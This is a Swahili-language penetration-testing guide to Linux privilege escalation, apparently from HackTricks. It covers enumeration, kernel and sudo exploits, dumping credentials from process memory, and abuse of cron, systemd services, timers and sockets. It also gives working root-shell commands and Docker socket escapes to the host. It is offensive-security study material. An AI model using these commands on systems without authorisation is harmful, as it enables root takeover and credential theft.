# Kupandisha Mamlaka kwenye Linux

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) ya kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Taarifa za Mfumo

### Taarifa za OS

Hebu tuanze kupata baadhi ya maarifa kuhusu OS inayotumika.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Njia

Ikiwa **una ruhusa ya kuandika kwenye folda yoyote ndani ya kipengee cha `PATH`** unaweza kuiba baadhi ya maktaba au programu za kutekeleza:
```bash
echo $PATH
```
### Taarifa za Mazingira

Je, kuna taarifa za kuvutia, nywila au funguo za API katika mazingira ya mazingira?
```bash
(env || set) 2>/dev/null
```
### Mbinu za Kudukua Kernel

Angalia toleo la kernel na kama kuna mbinu ya kudukua inayoweza kutumika kuongeza mamlaka.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Unaweza kupata orodha nzuri ya kernel zenye mapungufu na baadhi ya **mashambulizi yaliyoundwa tayari** hapa: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) na [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Mitandao mingine ambapo unaweza kupata baadhi ya **mashambulizi yaliyoundwa tayari**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Kuchambua toleo zote za kernel zenye mapungufu kutoka kwenye wavuti hiyo unaweza kufanya:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Vyombo vinavyoweza kusaidia kutafuta udhaifu wa kernel ni:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (itekelezwe NDANI ya mhanga, huchunguza udhaifu kwa kernel 2.x)

Daima **tafuta toleo la kernel kwenye Google**, labda toleo lako la kernel limeandikwa kwenye baadhi ya udhaifu wa kernel na kisha utahakikisha kuwa udhaifu huu ni halali.

### CVE-2016-5195 (DirtyCow)

Udhibiti wa Mamlaka wa Linux - Kernel ya Linux <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo toleo

Kulingana na matoleo hatarishi ya sudo yanayoonekana katika:
```bash
searchsploit sudo
```
Unaweza kuangalia kama toleo la sudo lina kasoro kwa kutumia grep hii.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Kutoka kwa @sickrov
```
sudo -u#-1 /bin/bash
```
### Uthibitisho wa saini ya Dmesg umeshindwa

Angalia **sanduku la smasher2 la HTB** kwa **mfano** wa jinsi hii udhaifu unaweza kutumiwa
```bash
dmesg 2>/dev/null | grep "signature"
```
### Uchunguzi zaidi wa mfumo
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Piga hesabu ulinzi unaowezekana

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity ni zana yenye nguvu ya kuzuia upenyezaji wa mizizi kwa kutoa kinga za ziada kwenye mfumo wa Linux.
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

### Execshield

Execshield ni kipengele cha usalama kilichojengwa kwenye kernel ya Linux ambacho huzuia mashambulizi ya buffer overflow kwa kuzuia sehemu ya kumbukumbu ya programu isiyoweza kutekelezwa.
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

### SElinux

SElinux ni teknolojia ya usalama iliyojengwa kwenye kernel ya Linux ambayo inawezesha udhibiti wa upatikanaji wa rasilimali kwa kutumia sera za usalama.
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR

ASLR (Address Space Layout Randomization) ni mbinu inayotumiwa katika ulinzi wa usalama wa mfumo wa uendeshaji. Inabadilisha mahali pa kumbukumbu muhimu katika mchakato wa programu kwa kufanya iwe ngumu kwa wadukuzi kutabiri mahali pa kumbukumbu na kufanya mashambulizi ya kufyeka.
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Kuvunja Docker

Ikiwa uko ndani ya kontena ya docker unaweza kujaribu kutoroka kutoka humo:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Madereva

Angalia **nini kimeunganishwa na kimeunganishwa**, wapi na kwa nini. Ikiwa kuna kitu kilichounganishwa unaweza kujaribu kuunganisha na kuangalia taarifa za kibinafsi
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Programu za Kufaa

Panga programu muhimu
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Pia, angalia ikiwa **compiler yoyote imewekwa**. Hii ni muhimu ikiwa unahitaji kutumia baadhi ya mbinu za kudukua kernel kwani inapendekezwa kuikusanya kwenye mashine ambayo utaitumia (au kwenye moja kama hiyo)
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Programu Zenye Udhaifu Zilizosakinishwa

Angalia **toleo la pakiti na huduma zilizosakinishwa**. Labda kuna toleo la zamani la Nagios (kwa mfano) ambalo linaweza kutumika kwa kufanya uwezekano wa kupata mamlaka zaidi...\
Inashauriwa kuangalia kwa mkono toleo la programu iliyosakinishwa ambayo inaonekana kuwa ya shaka zaidi.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ikiwa una ufikiaji wa SSH kwenye mashine unaweza pia kutumia **openVAS** kuchunguza programu iliyopitwa na wakati na inayoweza kudhuriwa iliyosakinishwa kwenye mashine.

{% hint style="info" %}
_Taarifa kwamba amri hizi zitaonyesha habari nyingi ambazo kwa kiasi kikubwa hazitakuwa na maana, kwa hivyo inapendekezwa kutumia programu kama OpenVAS au sawa nayo itakayochunguza ikiwa toleo lolote la programu iliyosakinishwa linaweza kudhuriwa na mashambulizi yanayojulikana_
{% endhint %}

## Mchakato

Angalia **mchakato gani** unatekelezwa na uchunguze ikiwa mchakato wowote una **mamlaka zaidi kuliko inavyopaswa** (labda tomcat inatekelezwa na root?)
```bash
ps aux
ps -ef
top -n 1
```
Hakikisha kila wakati kuna [**debuggers za electron/cef/chromium** zinazoendeshwa, unaweza kuzitumia kwa kujipandisha viwango vya ruhusa](electron-cef-chromium-debugger-abuse.md). **Linpeas** huchunguza hizo kwa kuangalia parameter `--inspect` ndani ya mstari wa amri ya mchakato.  
Pia **angalia ruhusa zako kwenye binaries za michakato**, labda unaweza kubadilisha faili ya mtu mwingine.

### Ufuatiliaji wa Mchakato

Unaweza kutumia zana kama [**pspy**](https://github.com/DominicBreuker/pspy) kufuatilia michakato. Hii inaweza kuwa na manufaa sana kwa kutambua michakato dhaifu inayoendeshwa mara kwa mara au wakati seti fulani ya mahitaji inakidhiwa.

### Kumbukumbu ya Mchakato

Baadhi ya huduma za seva hifadhi **vitambulisho kwa maandishi wazi ndani ya kumbukumbu**.  
Kawaida utahitaji **ruhusa ya mizizi** kusoma kumbukumbu ya michakato inayomilikiwa na watumiaji wengine, kwa hivyo hii kawaida ni muhimu zaidi unapokuwa tayari na ruhusa ya mizizi na unataka kugundua vitambulisho zaidi.  
Hata hivyo, kumbuka kwamba **kama mtumiaji wa kawaida unaweza kusoma kumbukumbu ya michakato unayomiliki**.

{% hint style="warning" %}
Tambua kwamba siku hizi **mashine nyingi haziruhusu ptrace kwa chaguo-msingi** ambayo inamaanisha huwezi kudump michakato mingine inayomilikiwa na mtumiaji wako asiye na ruhusa.

Faili _**/proc/sys/kernel/yama/ptrace\_scope**_ inadhibiti upatikanaji wa ptrace:

* **kernel.yama.ptrace\_scope = 0**: michakato yote inaweza kudebugiwa, mradi wawe na uid sawa. Hii ndiyo njia ya kawaida ya jinsi ptracing ilivyofanya kazi.
* **kernel.yama.ptrace\_scope = 1**: mchakato wa mzazi tu unaweza kudebugiwa.
* **kernel.yama.ptrace\_scope = 2**: Msimamizi pekee anaweza kutumia ptrace, kwani inahitaji uwezo wa CAP\_SYS\_PTRACE.
* **kernel.yama.ptrace\_scope = 3**: Hakuna michakato inayoweza kufuatiliwa na ptrace. Mara baada ya kuweka, ni lazima kuzima upya ili kuwezesha kufuatilia tena.
{% endhint %}

#### GDB

Ukiwa na ufikiaji wa kumbukumbu ya huduma ya FTP (kwa mfano) unaweza kupata Heap na kutafuta ndani ya vitambulisho vyake.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skripti ya GDB

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Kwa kitambulisho cha mchakato kilichopewa, **ramani inaonyesha jinsi kumbukumbu inavyoendelezwa ndani ya nafasi ya anwani ya kielelezo cha mchakato huo**; pia inaonyesha **ruhusa ya kila eneo lililoendelezwa**. Faili bandia ya **mem** **inadhihirisha kumbukumbu za mchakato yenyewe**. Kutoka kwa faili za **ramani** tunajua ni **eneo gani la kumbukumbu linaloweza kusomwa** na mapungufu yao. Tunatumia habari hii kwa **kutafuta kwenye faili ya mem na kudondosha maeneo yanayoweza kusomwa yote** kwenye faili.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` hutoa ufikiaji kwa **kumbukumbu** ya kimwili ya mfumo, siyo kumbukumbu ya kawaida. Nafasi ya anwani za kumbukumbu ya kawaida ya kernel inaweza kupatikana kwa kutumia /dev/kmem.\
Kawaida, `/dev/mem` inaweza kusomwa tu na mtumiaji wa **root** na kikundi cha **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump kwa linux

ProcDump ni kielelezo cha Linux cha zana ya kawaida ya ProcDump kutoka kwa seti ya zana za Sysinternals kwa Windows. Pata katika [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Vifaa

Kudumpisha kumbukumbu ya mchakato unaweza kutumia:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Unaweza kuondoa mahitaji ya root kwa mkono na kudump mchakato unaomilikiwa na wewe
* Skripti A.5 kutoka [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root inahitajika)

### Sifa kutoka Kumbukumbu ya Mchakato

#### Mfano wa Kibinafsi

Ikiwa utagundua kuwa mchakato wa kuthibitisha unafanya kazi:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Unaweza kudondosha mchakato (angalia sehemu zilizotangulia kupata njia tofauti za kudondosha kumbukumbu ya mchakato) na kutafuta sifa ndani ya kumbukumbu:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Chombo [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) kitapora **vitambulisho vya maandishi wazi kutoka kumbukumbu** na kutoka kwa baadhi ya **faili maarufu**. Inahitaji mamlaka ya mzizi ili kufanya kazi ipasavyo.

| Kipengele                                           | Jina la Mchakato     |
| ------------------------------------------------- | -------------------- |
| Nywila ya GDM (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Mawasiliano ya FTP ya Moja kwa Moja)                   | vsftpd               |
| Apache2 (Vikao vya Msingi vya HTTP vilivyo Hai)         | apache2              |
| OpenSSH (Vikao vya SSH vilivyo Hai - Matumizi ya Sudo)        | sshd:                |

#### Tafuta Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Kazi za Kipangilio/Cron

Angalia kama kuna kazi ya kipangilio inayoweza kuwa na mapungufu. Labda unaweza kutumia script inayotekelezwa na root (vuln ya wildcard? unaweza kuhariri faili ambazo root anatumia? tumia viungo vya alama? tengeneza faili maalum kwenye saraka ambayo root anatumia?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Njia ya Cron

Kwa mfano, ndani ya _/etc/crontab_ unaweza kupata PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Tafadhali kumbuka jinsi mtumiaji "user" ana ruhusa za kuandika juu ya /home/user_)

Ikiwa ndani ya crontab hii mtumiaji wa root anajaribu kutekeleza amri au script bila kuweka njia. Kwa mfano: _\* \* \* \* root overwrite.sh_\
Kisha, unaweza kupata shell ya root kwa kutumia:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron kutumia script na wildcard (Wildcard Injection)

Ikiwa script inatekelezwa na root ina "**\***" ndani ya amri, unaweza kutumia hii kufanya mambo ambayo hayakutarajiwa (kama privesc). Mfano:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ikiwa kichwa cha mshale kinafuatiwa na njia kama** _**/baadhi/ya/njia/\***_ **, sio dhaifu (hata** _**./\***_ **sio).**

Soma ukurasa ufuatao kwa mbinu zaidi za kutumia kichwa cha mshale:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Kuandika upya skripti ya Cron na kiungo cha alama

Ikiwa **unaweza kuhariri skripti ya cron** inayotekelezwa na root, unaweza kupata kabisa kuingia kwa urahisi:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ikiwa script inayotekelezwa na root inatumia **directory ambapo una ufikiaji kamili**, labda inaweza kuwa na manufaa kufuta folda hiyo na **kuunda kiungo cha folda kwenda nyingine** ikitoa script inayodhibitiwa na wewe
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Kazi za cron mara kwa mara

Unaweza kufuatilia michakato kutafuta michakato inayoendeshwa kila baada ya dakika 1, 2 au 5. Labda unaweza kunufaika nayo na kupandisha mamlaka.

Kwa mfano, kufuatilia kila baada ya **0.1s kwa dakika 1**, **panga kwa amri zilizoendeshwa kidogo** na futa amri zilizoendeshwa zaidi, unaweza kufanya:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Unaweza pia kutumia** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (hii itachunguza na kuorodhesha kila mchakato unaanza).

### Majukumu ya cron yasiyoonekana

Inawezekana kuunda jukumu la cron **kwa kuweka kurudi kiotomatiki baada ya maoni** (bila herufi ya mstari mpya), na jukumu la cron litafanya kazi. Mfano (zingatia herufi ya kurudi kiotomatiki):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Huduma

### Faili za _.service_ zinazoweza Kuandikwa

Angalia kama unaweza kuandika faili yoyote ya `.service`, ikiwa unaweza, unaweza **kuibadilisha** ili **itekeleze** mlango wako wa nyuma wakati huduma inapoanza, inapoanzishwa upya au inaposimamishwa (labda utahitaji kusubiri hadi mashine ibadilishwe).\
Kwa mfano, tengeneza mlango wako wa nyuma ndani ya faili ya .service na **`ExecStart=/tmp/script.sh`**

### Binaries za Huduma Zinazoweza Kuandikwa

Kumbuka kwamba ikiwa una **ruhusa ya kuandika juu ya binaries zinazotekelezwa na huduma**, unaweza kuzibadilisha kwa milango ya nyuma hivyo wakati huduma zinapopata kutekelezwa tena milango ya nyuma itatekelezwa.

### systemd PATH - Njia za Kihesabu

Unaweza kuona NJIA inayotumiwa na **systemd** na:
```bash
systemctl show-environment
```
Ikiwa utagundua kwamba unaweza **kuandika** katika folda yoyote kwenye njia unaweza kuwa na uwezo wa **kuinua mamlaka**. Unahitaji kutafuta **njia za kihusishi zinazotumiwa kwenye faili za mipangilio ya huduma** kama:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Kisha, tengeneza **faili inayoweza kutekelezwa** yenye **jina sawa na njia ya kihierarkia ya binary** ndani ya folda ya PATH ya systemd unayoweza kuandika, na wakati huduma inapoombwa kutekeleza hatua ya kuwa na kasoro (**Anza**, **Acha**, **Pakia tena**), **backdoor yako itatekelezwa** (watumiaji wasio na ruhusa kawaida hawawezi kuanza/kuacha huduma lakini angalia kama unaweza kutumia `sudo -l`).

**Jifunze zaidi kuhusu huduma kwa kutumia `man systemd.service`.**

## **Majalibizwa (Timers)**

**Majalibizwa (Timers)** ni faili za jedwali za systemd ambazo jina lake linamalizika kwa `**.timer**` ambazo huendesha faili au matukio ya `**.service**`. **Majalibizwa (Timers)** yanaweza kutumika kama mbadala wa cron kwani wana msaada wa kujengwa kwa matukio ya wakati wa kalenda na matukio ya wakati wa monotonic na yanaweza kukimbia kwa njia isiyo ya moja kwa moja.

Unaweza kuchambua majalibizwa yote kwa:
```bash
systemctl list-timers --all
```
### Timers zinazoweza kuandikwa

Ikiwa unaweza kuhariri timer unaweza kufanya iendelee kutekeleza baadhi ya vitengo vya systemd (kama `.service` au `.target`) zilizopo.
```bash
Unit=backdoor.service
```
Katika hati ya maelezo unaweza kusoma ni nini Kitengo:

> Kitengo cha kuamsha wakati huu wa kengele unapopita. Hoja ni jina la kitengo, ambalo sio ".timer". Ikiwa haielezwi, thamani hii inabadilika kiotomatiki kuwa huduma ambayo ina jina sawa na kitengo cha kengele, isipokuwa kwa kufikia mwisho. (Tazama hapo juu.) Inapendekezwa kwamba jina la kitengo kinachoamilishwa na jina la kitengo cha kengele vina majina sawa, isipokuwa kwa kufikia mwisho.

Kwa hivyo, ili kutumia ruhusa hii unahitaji:

* Pata kitengo cha systemd (kama `.service`) ambacho kina **utekelezaji wa faili inayoweza kuandikwa**
* Pata kitengo cha systemd ambacho kina **utekelezaji wa njia ya kihesabu** na una **ruhusa za kuandika** juu ya **NJIA ya systemd** (kujifanya kuwa utekelezaji huo)

**Jifunze zaidi kuhusu muda na `man systemd.timer`.**

### **Kuwezesha Kengele**

Kuwezesha kengele unahitaji ruhusa ya mzizi na kutekeleza:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Tafadhali kumbuka **timer** ina **anzishwa** kwa kuunda symlink kwake kwenye `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockets

Unix Domain Sockets (UDS) inawezesha **mawasiliano ya mchakato** kwenye mashine sawa au tofauti ndani ya mifano ya mteja-seva. Hutumia faili za maelezo za Unix za kawaida kwa mawasiliano kati ya kompyuta na huanzishwa kupitia faili za `.socket`.

Sockets zinaweza kusanidiwa kwa kutumia faili za `.socket`.

**Jifunze zaidi kuhusu sockets na `man systemd.socket`.** Ndani ya faili hii, vigezo kadhaa vya kuvutia vinaweza kusanidiwa:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Chaguo hizi ni tofauti lakini muhtasari hutumiwa kuonyesha **mahali itakaposikiliza** soketi (njia ya faili ya soketi ya AF\_UNIX, anwani ya IPv4/6 na/au nambari ya bandari ya kusikiliza, n.k.)
* `Accept`: Inachukua hoja ya boolean. Ikiwa ni **kweli**, kipengele cha **huduma kinazalishwa kwa kila uunganisho unaoingia** na soketi ya uunganisho pekee inapitishwa kwake. Ikiwa ni **uwongo**, soketi zote zinazosikiliza zenyewe zinapitishwa kwa kipengele cha huduma kilichoanzishwa, na kipengele kimoja cha huduma kinazalishwa kwa uunganisho wote. Thamani hii haizingatiwi kwa soketi za datagram na FIFO ambapo kipengele kimoja cha huduma kinashughulikia bila masharti trafiki yote inayoingia. **Ina thamani ya uwongo**. Kwa sababu za utendaji, inapendekezwa kuandika daemons mpya tu kwa njia inayofaa kwa `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: Inachukua mistari moja au zaidi ya amri, ambazo zina **tekelezwa kabla ya** au **baada ya** soketi za kusikiliza/FIFOs kuwa **zimeundwa** na kufungwa, mtawalia. Token ya kwanza ya mstari wa amri lazima iwe jina la faili kamili, kisha ikifuatiwa na hoja za mchakato.
* `ExecStopPre`, `ExecStopPost`: **Amri** za ziada ambazo zinatekelezwa **kabla ya** au **baada ya** soketi za kusikiliza/FIFOs kuwa **zimefungwa** na kuondolewa, mtawalia.
* `Service`: Inabainisha jina la kipengele cha **huduma cha kuamilisha** kwenye **trafiki inayoingia**. Mipangilio hii inaruhusiwa tu kwa soketi zenye Accept=no. Kwa kawaida inarudi kwa huduma inayobeba jina sawa na soketi (na kiambishi kilichobadilishwa). Katika hali nyingi, haitakuwa lazima kutumia chaguo hili.

### Faili za .socket zenye uwezo wa kuandikwa

Ikiwa unapata faili ya `.socket` inayoweza **kuandikwa**, unaweza **kuongeza** mwanzoni mwa sehemu ya `[Socket]` kitu kama: `ExecStartPre=/home/kali/sys/backdoor` na mlango wa nyuma utatekelezwa kabla ya soketi kuundwa. Kwa hivyo, **labda utahitaji kusubiri hadi mashine ibadilishwe.**\
_Tafadhali kumbuka kuwa mfumo lazima utumie usanidi wa faili ya soketi au mlango wa nyuma hautatekelezwa_

### Sockets zenye uwezo wa kuandikwa

Ikiwa **unatambua soketi inayoweza kuandikwa** (_sasa tunazungumzia juu ya Sockets za Unix na sio kuhusu faili za usanidi `.socket`_), basi **unaweza kuwasiliana** na soketi hiyo na labda kutumia udhaifu.

### Panga Sockets za Unix
```bash
netstat -a -p --unix
```
### Uunganisho ghafi
```bash
#apt-get install netcat-openbsd
nc -U /tmp/socket  #Connect to UNIX-domain stream socket
nc -uU /tmp/socket #Connect to UNIX-domain datagram socket

#apt-get install socat
socat - UNIX-CLIENT:/dev/socket #connect to UNIX-domain socket, irrespective of its type
```
**Mfano wa Utekaji:**

{% content-ref url="socket-command-injection.md" %}
[socket-command-injection.md](socket-command-injection.md)
{% endcontent-ref %}

### Soketi za HTTP

Tafadhali elewa kwamba kunaweza kuwa na **soketi zinazosikiliza maombi ya HTTP** (_Sisemi kuhusu faili za .socket bali faili zinazofanya kazi kama soketi za unix_). Unaweza kuchunguza hili kwa kutumia:
```bash
curl --max-time 2 --unix-socket /pat/to/socket/files http:/index
```
### Soketi Inapojibu ombi la HTTP

Ikiwa soketi **inajibu ombi la HTTP**, basi unaweza **kuwasiliana** nayo na labda **kutumia udhaifu fulani**.

### Soketi ya Docker Inayoweza Kuandikwa

Soketi ya Docker, mara nyingi hupatikana kwenye `/var/run/docker.sock`, ni faili muhimu ambayo inapaswa kulindwa. Kwa chaguo-msingi, inaweza kuandikwa na mtumiaji wa `root` na wanachama wa kikundi cha `docker`. Kuwa na ufikiaji wa kuandika kwenye soketi hii kunaweza kusababisha ukuaji wa mamlaka. Hapa kuna maelezo ya jinsi hii inaweza kufanywa na njia mbadala ikiwa CLI ya Docker haipatikani.

#### **Ukuaji wa Mamlaka na CLI ya Docker**

Ikiwa una ufikiaji wa kuandika kwenye soketi ya Docker, unaweza kuongeza mamlaka kwa kutumia amri zifuatazo:
```bash
docker -H unix:///var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
docker -H unix:///var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
```
#### **Kutumia Docker API Moja kwa Moja**

Katika hali ambapo Docker CLI haipatikani, soketi ya Docker inaweza bado kudhibitiwa kwa kutumia Docker API na amri za `curl`.

1.  **Orodhesha Picha za Docker:** Pata orodha ya picha zilizopo.

```bash
curl -XGET --unix-socket /var/run/docker.sock http://localhost/images/json
```
2.  **Unda Kontena:** Tuma ombi la kuunda kontena ambalo linamount saraka kuu ya mfumo wa mwenyeji.

```bash
curl -XPOST -H "Content-Type: application/json" --unix-socket /var/run/docker.sock -d '{"Image":"<ImageID>","Cmd":["/bin/sh"],"DetachKeys":"Ctrl-p,Ctrl-q","OpenStdin":true,"Mounts":[{"Type":"bind","Source":"/","Target":"/host_root"}]}' http://localhost/containers/create
```

Anza kontena ulilounda:

```bash
curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/<NewContainerID>/start
```
